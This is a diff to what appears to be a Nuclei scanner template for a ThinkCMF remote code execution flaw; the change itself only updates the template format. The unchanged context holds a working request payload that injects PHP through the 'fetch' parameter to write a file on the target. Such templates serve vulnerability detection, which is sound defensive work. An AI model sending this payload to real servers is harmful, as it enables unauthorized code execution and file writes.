@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: thinkcmf-rce
 info:
   name: ThinkCMF - Remote Code Execution
@@ -11,7 +12,7 @@ info:
     cvss-score: 10.0
     cwe-id: CWE-77
   tags: thinkcmf,rce
-requests:
+http:
   - raw:
       - |
         GET /index.php?a=fetch&content={{url_encode('<?php file_put_contents(\"{{randstr}}.php\",\"<?php echo phpinfo();\");')}} HTTP/1.1
